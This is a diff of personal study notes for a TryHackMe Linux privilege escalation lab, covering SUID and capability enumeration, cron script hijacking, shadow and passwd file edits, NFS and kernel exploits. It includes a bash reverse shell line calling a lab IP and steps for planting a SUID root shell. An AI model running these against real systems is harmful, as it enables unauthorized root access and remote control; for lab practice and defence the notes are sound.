@@ -1,5 +1,5 @@
 https://tryhackme.com/room/linuxprivesc
-# Enumerate
+# Enumeration for Priv Esc Oppurtunities
 
 ## Initial commands to use
 
@@ -48,6 +48,11 @@ try open rootshell
 
 SUID GUID bit set files
 `find / -type f -perm -04000 -ls 2>/dev/null`
+
+capabilities
+`getcap -r / 2>/dev/null
+
+
 
 ## Find
 
@@ -154,8 +159,10 @@ Start a server from the directory that contains LinEnum.sh
 The RootHelper/Linux Smart Enumeration module is a LinEnum fork with a heavy focus on privilege escalation.
 https://github.com/NullArray/RootHelper
 
+
+
 ---
-# Priv Esc
+# Priv Esc Exploits 
 
 ## Unshadow Tool
 
@@ -356,10 +363,12 @@ OR
 Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
 ```shell
 #!/bin/bash  
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+bash -i >& /dev/tcp/10.4.61.7/9001 0>&1
 ```
 
 ### Cron PATH Variable
+
+If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file
 
 Search the PATH variable and see taht it starts with **/home/user** which is our user's home directory.
 `PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -370,7 +379,7 @@ there is a job containing:
 `#!/bin/bash  
 `cp /bin/bash /tmp/rootbash  
 `chmod +xs /tmp/rootbash
-- Make sure that the file is executable:
+			**Make sure that the file is executable:**
 `chmod +x /home/user/overwrite.sh`
 
 - Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
@@ -440,6 +449,13 @@ Exit out of the MYSQL shelll using `exit` then run the /tmp/rootbash executable 
 ```
 
 
+## Capabilities
+
+find binaries that have the `CAP SETUID` option set
+`getcap -r / 2>/dev/null
+Search GTFOBINS under the "Capabilities" Headers
+
+
 ## Weak File Permissions
 
 ### Readable `/etc/shadow` allows you to crack password Hashes
@@ -454,13 +470,13 @@ Read/Writeable shadow file permissions:
 ~$ ls -l /etc/shadow
 -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
 ```
-### Writeable `/etc/shadow`  
+## Writeable `/etc/shadow`  
 
 - Generate a new password hash with a password of your choice: `mkpasswd -m sha-512 newpasswordhere`
 - Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
 - Switch to the root user, using the new password: `su root`
 
-### Writable /etc/passwd
+## Writable /etc/passwd
 
 - Generate a new password hash with a password of your choice: `openssl passwd newpasswordhere`
 - Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
@@ -471,7 +487,7 @@ Alternatively, copy the root user's row and append it to the bottom of the file,
 Now switch to the newroot user, using the new password: `su newroot`
 
 
-### Shell escape
+## Shell escape
 
 https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/
 
@@ -545,7 +561,7 @@ Note that the **/tmp** share has root squashing disabled.
 `chmod +xs /tmp/nfs/shell.elf`
 
 
-### Kernel Exploits
+## Kernel Exploits
 
 1. Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:
 `perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`
